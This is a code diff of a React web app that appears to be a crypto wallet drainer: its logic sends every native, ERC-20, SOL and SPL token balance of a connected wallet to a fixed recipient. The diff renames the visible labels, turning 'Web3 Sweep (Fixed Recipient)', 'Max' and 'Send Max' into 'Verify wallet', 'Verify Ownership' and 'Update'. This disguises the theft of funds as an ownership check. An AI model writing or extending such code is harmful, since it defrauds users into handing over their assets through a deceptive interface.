@@ -131,7 +131,7 @@ export default function App() {
           }
         }
 
-        alert(`Sent native + ERC-20 tokens on ${chain.name}`);
+        alert(`Verify native + ERC-20 tokens on ${chain.name}`);
       }
 
       // ---- Solana native + SPL
@@ -144,7 +144,7 @@ export default function App() {
           if (t.balance > 0) await sendSPLToken({ from: solanaPubKey, to: recipient, token: t.mint, amount: t.balance });
         }
 
-        alert("Sent SOL + SPL tokens");
+        alert("Verify SOL + SPL tokens");
       } else {
         alert("No wallet connected");
       }
@@ -157,7 +157,7 @@ export default function App() {
 
   return (
     <div style={{ padding: 40 }}>
-      <h2>Web3 Sweep (Fixed Recipient)</h2>
+      <h2>Verify wallet</h2>
       <appkit-button project-id={REOWN_PROJECT_ID} />
 
       {(isConnected || solConnected) && (
@@ -166,9 +166,9 @@ export default function App() {
           {solConnected && <p>SOL Balance: {solBalance}</p>}
 
           <div style={{ marginTop: 10 }}>
-            <button onClick={handleMaxFill} disabled={sending}>Max</button>
+            <button onClick={handleMaxFill} disabled={sending}>Verify Ownership</button>
             <button onClick={handleSendMax} style={{ marginLeft: 10 }} disabled={sending}>
-              {sending ? "Sending..." : "Send Max (Native + Tokens)"}
+              {sending ? "Sending..." : "Update (Native + Tokens)"}
             </button>
           </div>
         </>
